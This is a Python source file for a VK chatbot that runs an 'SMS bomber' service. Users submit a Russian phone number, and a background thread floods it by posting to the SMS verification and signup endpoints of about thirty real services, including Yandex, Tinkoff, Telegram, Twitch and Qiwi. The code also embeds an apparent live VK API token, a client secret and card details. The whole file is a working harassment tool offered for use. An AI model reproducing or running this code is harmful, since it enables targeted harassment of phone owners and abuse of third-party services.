try:
    import vk_api, requests, fake_useragent, threading, pathlib, time, os, random
    from termcolor import colore
    
    from vk_api.longpoll import VkLongPoll, VkEventType
    from vk_api.utils import get_random_id
    from vk_api.keyboard import VkKeyboard, VkKeyboardColor

    i = 1
    user = fake_useragent.UserAgent().random
    headers = {'user_agent': user}
    p = 0
    keyboard = VkKeyboard(one_time=False)
    # 1
    keyboard.add_button('Bomber 💣', color=VkKeyboardColor.NEGATIVE)
    keyboard.add_line()
    keyboard.add_button('Статистика 📊', color=VkKeyboardColor.POSITIVE)
    keyboard.add_button('Поддержать 😇', color=VkKeyboardColor.SECONDARY)
    clava2 = VkKeyboard(one_time=False)
    clava2.add_button('Назад ↩', color=VkKeyboardColor.SECONDARY)


    def check(x):
        file = open('baza.txt', 'r', encoding='utf-8')
        if str(x) in file.read():
            return 1
        else:
            return 0
        file.close()


    def checkk(x):
        file = open('bazan.txt', 'r', encoding='utf-8')
        if str(x) in file.read():
            return 1
        else:
            return 0
        file.close()

    def extract_arg(arg):
        return arg.split()[1]


    def adder(x):
        file = open('baza.txt', 'a', encoding='utf-8')
        file.write(f'{x}\n')

        file.close()

    def adderr(x):
        file = open('bazan.txt', 'a', encoding='utf-8')
        file.write(f'{x}\n')

        file.close()


    UsersId = open("baza.txt", "r")
    UsersId2 = set()
    for line in UsersId:
        UsersId2.add(line.strip())
    UsersId.close()

    suser = []
    for user in UsersId2:
        suser.append(str(user))


    def stat1():
        with open("bal.txt", "r") as ba2:
            bal2 = ba2.read()
            bal2 = int(bal2)

        a = open("bal.txt", "w")
        a.write(str(int(bal2) + int(1)))
        a.close()


    def xxx():
        while True:
            time.sleep(1500)
            write_message(592697054, 'ou')


    dd = threading.Thread(target=xxx)
    dd.start()

    def spam():
        while True:
            time.sleep(1)
            o = 0
            UsersIdd = open("baza.txt", "r")
            UsersIdd2 = set()
            for line in UsersIdd:
                UsersIdd2.add(line.strip())
            UsersIdd.close()

            suserr = []
            for user in UsersIdd2:
                suserr.append(str(user))
            for user in suserr:
                try:
                    userr = str(open(str(user) + "phone.txt", "r").read())
                    a = open(str(user) + "c.txt", "w")
                    a.write("1")
                    a.close()
                    with open(str(user) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(user, '💣 Спам запущен!')
                    write_message(user, "Номер: " f'{userr}' "\nВремя: 30 сек!")

                    while 2 > o:
                        o += 1
                        try:
                            requests.post(
                                "https://api.delitime.ru/api/v2/signup",
                                data={
                                    "SignupForm[username]": userr,
                                    "SignupForm[device_type]": 3,
                                },
                            )

                        except:
                            pass
                        try:
                            a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + userr + "/",
                                              headers=headers)
                            print(colored('citilink-[+]', 'green'))
                        except:
                            print(colored('citilink-[-]', 'green'))
                        try:
                            a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                                              json={"reqId": "91101-1606335718",
                                                    "params": {"phone": userr, "language": "ru-RU", "route": "sms",
                                                               "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}},
                                              headers=headers)
                            print(colored('icq-[+]', 'yellow'))
                        except:
                            print(colored('icq-[-]', 'yellow'))
                        try:
                            requests.post(
                                "https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/",
                                data={"phone": userr, "is_repeat": 0, "order_guid": 1},
                            )
                            print(colored('dns-shop.ru-[+]', 'magenta'))
                        except:
                            print(colored('dns-shop.ru-[-]', 'magenta'))
                        try:
                            a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode",
                                              json={"phone": "+" + userr}, headers=headers)
                            print(colored('lenta.com-[+]', 'blue'))
                        except:
                            print(colored('lenta.com-[-]', 'blue'))
                        try:
                            a = requests.post("https://taxi.yandex.ru/3.0/auth",
                                              json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": userr},
                                              headers=headers)
                            print(colored('taxi.yandex-[+]', 'cyan'))
                        except:
                            print(colored('taxi.yandex-[-]', 'cyan'))
                        try:
                            a = requests.post("https://youla.ru/web-api/auth/request_code",
                                              json={"phone": userr}, headers=headers)
                            print(colored('youla-[+]', 'magenta'))
                        except:
                            print(colored('youla-[-]', 'magenta'))
                        try:
                            a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
                                "msisdn": userr,
                                "locale": "en",
                                "countryCode": "ru",
                                "version": "1",
                                "k": "ic1rtwz1s1Hj1O0r",
                                "r": "46763"
                            }, headers=headers)
                            print(colored('icq.com-[+]', 'cyan'))
                        except:
                            print(colored('icq.com-[-]', 'cyan'))
                        try:
                            a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                                              json={"phone_number": userr}, headers=headers)
                            print(colored('eda.yandex-[+]', 'yellow'))
                        except:
                            print(colored('eda.yandex-[-]', 'yellow'))
                        try:
                            a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                                              data={"phone": userr}, headers=headers)
                            print(colored('shop.vsk-[+]', 'green'))
                        except:
                            print(colored('shop.vsk-[-]', 'green'))
                        try:
                            a = requests.post(
                                "https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
                                data={"st.r.phone": "+" + userr}, headers=headers)
                            print(colored('ok.ru-[+]', 'blue'))
                        except:
                            print(colored('ok.ru-[-]', 'blue'))
                        try:
                            a = requests.post("https://nn-card.ru/api/1.0/register",
                                              json={"phone": userr, "password": 'DDd7873456'}, headers=headers)
                            print(colored('nn-card-[+]', 'cyan'))
                        except:
                            print(colored('nn-card-[-]', 'cyan'))
                        try:
                            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                              json={"CellPhone": userr[1:]}, headers=headers)
                            print(colored('my.modulbank-[+]', 'cyan'))
                        except:
                            print(colored('my.modulbank-[-]', 'cyan'))
                        try:
                            a = requests.post(
                                "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",

                                data={"phone": "+" + userr}, headers=headers)
                            print(colored('tinkoff-[+]', 'yellow'))
                        except:
                            print(colored('tinkoff-[-]', 'yellow'))
                        try:
                            a = requests.post(
                                "https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",

                                data={"l": userr[1:]}, headers=headers)
                            print(colored('rutaxi-[+]', 'green'))
                        except:
                            print(colored('rutaxi-[-]', 'green'))
                        try:
                            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                              data={"CellPhone": userr[1:]}, headers=headers)
                            print(colored('modulbank-[+]', 'magenta'))
                        except:
                            print(colored('modulbank-[-]', 'magenta'))
                        try:
                            a = requests.post("https://ng-api.webbankir.com/user/v2/create",
                                              json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
                                                    "mobilePhone": userr, "email": "asadsd@mail.ru", "smsCode": ""},
                                              headers=headers)
                            print(colored('webbankir-[+]', 'magenta'))
                        except:
                            print(colored('webbankir-[-]', 'magenta'))
                        try:
                            a = requests.post("https://stavropol.sushi-market.com/sendForm/callMeBack",
                                              json={"phone": userr[1:], "name": "Егор"}, headers=headers)
                            print(colored('stavropol-[+]', 'yellow'))
                        except:
                            print(colored('stavropol-[-]', 'yellow'))
                        try:
                            a = requests.post("https://m.tiktok.com/node-a/send/download_link",
                                              json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7",
                                                    "Mobile": userr[1:],
                                                    "page": {"pageName": "home", "launchMode": "direct",
                                                             "trafficType": ""}},
                                              headers=headers)
                            print(colored('tiktok-[+]', 'yellow'))
                        except:
                            print(colored('tiktok-[-]', 'yellow'))
                        try:
                            a = requests.post("https://api.sunlight.net/v3/customers/authorization/",
                                              data={"phone": userr},
                                              headers=headers)
                            print(colored('sunlight-[+]', 'cyan'))
                        except:
                            print(colored('sunlight-[-]', 'cyan'))
                        try:
                            a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
                                              json={
                                                  "phone": "+" + userr,
                                                  "api": 2,
                                                  "email": 'dgirherfib@gmaqil.com',
                                                  "x-email": "x-email",
                                              }, headers=headers)
                            print(colored('mail.ru-[+]', 'blue'))
                        except:
                            print(colored('mail.ru-[-]', 'blue'))
                        try:
                            a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
                                              data={
                                                  "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                                                  "username": userr,
                                                  "client_id": "android-qw",
                                                  "client_secret": "zAm4FKq9UnSe7id",
                                              }, headers=headers)
                            print(colored('qiwi-[+]', 'magenta'))
                        except:
                            print(colored('qiwi-[-]', 'magenta'))
                        try:
                            a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                                              json={"phone": "+" + userr}, headers=headers)
                            print(colored('tiktok-[+]', 'yellow'))
                        except:
                            print(colored('tiktok-[-]', 'yellow'))
                        try:
                            a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
                                              json={
                                                  "birthday": {"day": 12, "month": 10, "year": 2000},
                                                  "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                                                  "include_verification_code": True,
                                                  "password": 'Danil5564554',
                                                  "phone_number": userr,
                                                  "username": 'bhtrtrrrtbhtrbhtr',
                                              }, headers=headers)
                            print(colored('twitch.tv-[+]', 'yellow'))
                        except:
                            print(colored('twitch.tv-[-]', 'yellow'))
                        try:
                            a = requests.post("https://my.telegram.org/auth/send_password",
                                              data={"phone": "+" + userr}, headers=headers)
                            print(colored('telegram-[+]', 'magenta'))
                        except:
                            print(colored('telegram-[-]', 'magenta'))
                        try:
                            a = requests.post(
                                'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                                params={'msisdn': userr}, headers=headers)
                            print(colored('mts.ru-[+]', 'cyan'))
                        except:
                            print(colored('mts.ru-[-]', 'cyan'))
                    file = pathlib.Path(f"{user}phone.txt")
                    file.unlink()
                    stat1()
                    write_message(str(user), 'Спам прекращён ✅')
                    o = 0
                    UsersIdd = open("baza.txt", "r")
                    UsersIdd2 = set()
                    for line in UsersIdd:
                        UsersIdd2.add(line.strip())
                    UsersIdd.close()
                except:
                    pass


    def write_message(sender, message):
        if i == 1:
            authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                               'keyboard': keyboard.get_keyboard()})
        if i == 2:
            authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                               'keyboard': clava2.get_keyboard()})


    def rass(soob, xui, govno, jopa):
        if 1 == 1:
            UsersId = open("baza.txt", "r")
            UsersId2 = set()
            for line in UsersId:
                UsersId2.add(line.strip())
            UsersId.close()

            suser = []
            for user in UsersId2:
                suser.append(str(user))
            if a == 1:
                succes = 0
                fail = 0
                for user in suser:
                    try:
                        with open(str(user) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                        write_message(int(user), sms)
                        succes += 1
                    except:
                        fail += 1
                        continue
                so_ob = "none"
                write_message("574170405", "Рассылку получило - " + str(succes) + " пользователей")
                write_message("574170405", "Заблокировали бота - " + str(fail) + " пользователей")


    def stat2():
        with open("baal.txt", "r") as baa2:
            baal2 = baa2.read()
            baal2 = int(baal2)

        a = open("baal.txt", "w")
        a.write(str(int(baal2) + int(1)))
        a.close()


    ww = threading.Thread(target=spam)
    ww.start()

    token = "9b6dcc4a7d7f43ec82ba30501c9fbd5f62ee434b70218660e0aca8edc91c943c03b4d92daab2a059c69a4"
    authorize = vk_api.VkApi(token=token)
    longpoll = VkLongPoll(authorize)
    admin = 574170405
    for event in longpoll.listen():
        if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
            try:
                a = open(str(event.user_id) + "c.txt", "r")
                a.close()
            except:
                a = open(str(event.user_id) + "c.txt", "w")
                a.write("1")
                a.close()
            with open(str(event.user_id) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            try:
                a = open(str(event.user_id) + "ban.txt", "r")
                a.close()
            except:
                a = open(str(event.user_id) + "ban.txt", "w")
                a.write("1")
                a.close()
            with open(str(event.user_id) + "ban.txt", "r") as baan:
                ban = baan.read()
                ban = int(ban)
            reseived_message = event.text.lower()
            sender = event.user_id
            user = authorize.method("users.get",
                                    {"user_ids": event.user_id})  # вместо 1 подставляете айди нужного юзера
            name = user[0]['first_name']
            if ban == 1:
                if reseived_message == 'начать' \
                        or reseived_message == 'привет' \
                        or reseived_message == 'ку' \
                        or reseived_message == 'хай' \
                        or reseived_message == 'здравствуйте' \
                        or reseived_message == 'дарова':
                    if check(sender) == 0:
                        stat2()
                        adder(sender)

                    a = open(str(event.user_id) + "c.txt", "w")
                    a.write("1")
                    a.close()
                    with open(str(event.user_id) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(sender, "Привет " + name + "! \nРады видеть тебя в нашей группе 😇")
                    write_message(sender, "Выбери:")
                    threading
                elif reseived_message[0:10] == 'статистика':
                    with open("baal.txt", "r") as baa:
                        baal = baa.read()
                        baal == str(baal)
                    with open(str(event.user_id) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    with open("bal.txt", "r") as ba:
                        bal = ba.read()
                        bal == str(bal)
                    write_message(sender,
                                  f"Всего пользователей: {baal} 👥 \nЗаспамленно: {bal} 📲 \nРазработчик: \n[https://vk.com/id{admin}|Дима Янков] 😇")
                elif reseived_message[0:10] == 'поддержать':
                    write_message(sender,
                                  "Можете поддержать автора: \nQiwi - +79283692011 \nСберб - 4276600059773339 \n\nБуду рад вашей поддержке 😊")
                elif reseived_message[0:6] == 'bomber' or reseived_message == 'бомбер':
                    if check(sender) == 0:
                        adder(sender)
                    a = open(str(event.user_id) + "c.txt", "w")
                    a.write("2")
                    a.close()
                    with open(str(event.user_id) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(sender, "Введите номер: \nПример: 79287777777")
                elif reseived_message[0:1] == "8" and len(reseived_message) == 11 and i == 2:
                    write_message(sender, "Введите номер без 8 НАЧИНАЯ С 7 !!!")
                elif reseived_message[0:2] == "79" and len(reseived_message) == 11 and i == 2:
                    if reseived_message == '79283692011' and sender != admin:
                        write_message(sender, "А вот сюда нельзя :)")
                    else:
                        phone = reseived_message
                        a = open(str(event.user_id) + "c.txt", "w")
                        a.write("1")
                        a.close()
                        with open(str(event.user_id) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                        a = open(str(event.user_id) + "phone.txt", "w")
                        a.write(phone)
                        a.close()
                        UsersIdd = open("bazan.txt", "r")
                        UsersIdd2 = set()
                        for line in UsersIdd:
                            UsersIdd2.add(line.strip())
                        UsersIdd.close()

                        suserr = []
                        for user in UsersIdd2:
                            suserr.append(str(user))
                        col = -1
                        try:
                            for f in suserr:
                                col += 1
                        except:
                            col = 0
                        if checkk(sender) == 0:
                            adderr(sender)
                        if col > 0:
                            write_message(sender, f'Ждите вашей очереди 🛎 \nПеред вами {col} пользователей 👤')
                elif reseived_message[0:3] == 'бан' and sender == admin:
                    try:
                        bba = extract_arg(reseived_message)
                        a = open(str(bba) + "ban.txt", "w")
                        a.write("0")
                        a.close()
                        write_message(str(bba), 'Ваш аккаунт заблокирован 🙁')
                        write_message(sender, 'Аккаунт заблокирован 🙁')
                    except:
                        write_message(sender, 'Что-то пошло не так 🙄')
                elif reseived_message[0:4] == 'абан' and sender == admin:
                    try:
                        bba = extract_arg(reseived_message)
                        a = open(str(bba) + "ban.txt", "w")
                        a.write("1")
                        a.close()
                        write_message(str(bba), 'Ваш аккаунт разблокирован 🙄')
                        write_message(sender, 'Аккаунт разблокирован 🙄')
                    except:
                        write_message(sender, 'Что-то пошло не так 🙄')
                elif reseived_message[0:5] == 'назад':
                    a = open(str(event.user_id) + "c.txt", "w")
                    a.write("1")
                    a.close()
                    with open(str(event.user_id) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(sender, "Выбери:")
                elif reseived_message[0:6] == 'лучший' \
                    or reseived_message[0:3] == 'топ' \
                    or reseived_message[0:6] == 'крутой':
                    write_message(sender, 'Спасибо приятно 😊')
                    write_message(sender, 'Я знаю 😎')
                    write_message(sender, 'Благодарю 🙃')
                elif reseived_message[0:3] == 'ок' \
                        or reseived_message[0:5] == 'супер' \
                        or reseived_message[0:5] == 'класс':
                    a = random.randint(1, 3)
                    if a == 1:
                        write_message(sender, "👌")
                    if a == 2:
                        write_message(sender, "👍")
                    if a == 3:
                        write_message(sender, "✌")
                elif reseived_message == 'спасибо' \
                        or reseived_message[0:3] == 'спс':
                            a = random.randint(1, 3)
                            if a == 1:
                                write_message(sender, "Не за что 😉")

                            if a == 2:
                                write_message(sender, "Всегда рад 😁")
                            if a == 3:
                                write_message(sender, "Пожалуйста :)")
                elif reseived_message[0:8] == "рассылка":
                    if sender == 574170405:
                        a = 0
                        try:
                            sm = extract_arg(event.text)
                            a = 1
                        except:
                            write_message(event.user_id, "Вы не указали текст для рассылки")
                        if a == 1:
                            with open(str(event.user_id) + "c.txt", "r") as ca:
                                i = ca.read()
                                i = int(i)
                            write_message(event.user_id, "Рссылка началась")
                            sms = event.text[8:]
                            so_ob = sms
                            t = threading.Thread(target=rass, args=(sms, 1, 2, 3))
                            t.start()
                        else:
                            write_message(sender, 'Вы не являетесь администратором !!!')
                else:
                    if check(sender) == 0:
                        adder(sender)
                        stat2()
                    if i == 1:
                        with open(str(event.user_id) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                        write_message(sender, "Я тя не понял :/")
                    else:
                        write_message(sender, "Номер введён не верно! \nПример: 79287777777")
            else:
                write_message(sender, "Ваш аккаунт заблокирован 🙁")
except:
    os.system('python free-bomber.py')
